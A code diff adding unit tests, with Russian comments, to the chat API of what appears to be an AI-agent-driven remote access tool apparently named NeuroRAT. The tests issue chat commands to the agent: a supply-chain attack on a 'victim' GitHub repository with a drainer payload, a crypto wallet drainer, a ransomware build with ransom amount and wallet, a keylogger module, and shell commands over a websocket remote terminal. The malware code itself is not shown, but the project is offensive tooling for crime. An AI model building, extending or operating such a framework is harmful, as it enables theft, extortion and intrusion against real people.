@@ -390,6 +390,114 @@ class TestChatAPI(unittest.TestCase):
         self.assertTrue(any(e["content"] == msg for e in history if e["sender"] == "user"))
         self.assertTrue(any(e["sender"] == "agent" for e in history))
 
+    def test_terminal_websocket(self):
+        # Проверяем, что websocket endpoint для терминала существует и отвечает (имитация)
+        import websockets
+        import asyncio
+        async def ws_test():
+            uri = f"ws://localhost:8000/api/agent/terminal/ws?agent_id={self.agent_id}"
+            try:
+                async with websockets.connect(uri) as websocket:
+                    await websocket.send('{"command": "whoami"}')
+                    msg = await websocket.recv()
+                    self.assertIn("output", msg)
+            except Exception as e:
+                self.skipTest(f"WebSocket not available: {e}")
+        try:
+            asyncio.get_event_loop().run_until_complete(ws_test())
+        except Exception:
+            pass
+
+    def test_function_calling_api(self):
+        # Проверяем, что !api_call supply_chain_attack работает через чат
+        msg = '!api_call supply_chain_attack {"target": "github.com/victim/repo", "payload": "drainer"}'
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        self.assertTrue("supply-chain" in data["response"] or "supply_chain" in data["response"] or "drainer" in data["response"])
+
+    def test_file_upload(self):
+        # Проверяем загрузку файла через API
+        import io
+        file_content = b"testdata123"
+        resp = self.client.post(
+            "/api/files/upload",
+            data={"agent_id": self.agent_id},
+            files={"file": ("test.txt", io.BytesIO(file_content), "text/plain")}
+        )
+        self.assertEqual(resp.status_code, 200)
+        self.assertIn("uploaded", resp.text.lower())
+
+    def test_prompt_modal(self):
+        # Проверяем, что Model_Prompt.md и Agent Plan.md доступны через /static
+        resp1 = self.client.get("/static/Model_Prompt.md")
+        resp2 = self.client.get("/static/Agent%20Plan.md")
+        self.assertEqual(resp1.status_code, 200)
+        self.assertIn("агент", resp1.text.lower())
+        self.assertEqual(resp2.status_code, 200)
+        self.assertIn("neurorat", resp2.text.lower())
+
+    def test_reasoning_chain_of_thought(self):
+        # Проверяем reasoning/chain-of-thought через чат
+        msg = '!reasoning'
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        self.assertEqual(data["response_type"], "reasoning")
+        chain = data["response"]
+        self.assertIn("sections", chain)
+        self.assertIn("conclusion", chain)
+        self.assertIn("actions", chain)
+        # Если есть actions, должен быть actions_output
+        if chain["actions"]:
+            self.assertIn("actions_output", chain)
+
+    def test_wallet_drainer_api_call(self):
+        msg = '!api_call wallet_drainer {}'
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        self.assertIn("wallet_drainer", data["response"])
+
+    def test_ransomware_build_api_call(self):
+        msg = '!api_call ransomware_build {"wallet_address": "test_wallet", "ransom_amount": "0.01 BTC"}'
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        self.assertIn("ransomware_build", data["response"])
+
+    def test_run_module_api_call(self):
+        msg = '!run_module keylogger'
+        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertIn("response", data)
+        self.assertIn("run_module", data["response"])
+
+    def test_chat_history_filter_download(self):
+        # Добавляем несколько сообщений
+        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "test1", "autonomous_mode": False})
+        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "test2", "autonomous_mode": False})
+        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "!reasoning", "autonomous_mode": False})
+        # Фильтрация по search
+        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?search=test1")
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertTrue(any("test1" in e.get("content", "") for e in data))
+        # Фильтрация по sender
+        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?sender=reasoning")
+        self.assertEqual(resp.status_code, 200)
+        data = resp.json()
+        self.assertTrue(any(e.get("sender") == "reasoning" for e in data))
+        # Выгрузка истории (download)
+        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?download=true")
+        self.assertEqual(resp.status_code, 200)
+        self.assertIn("application/json", resp.headers.get("content-type", ""))
+
 
 if __name__ == '__main__':
     unittest.main() 
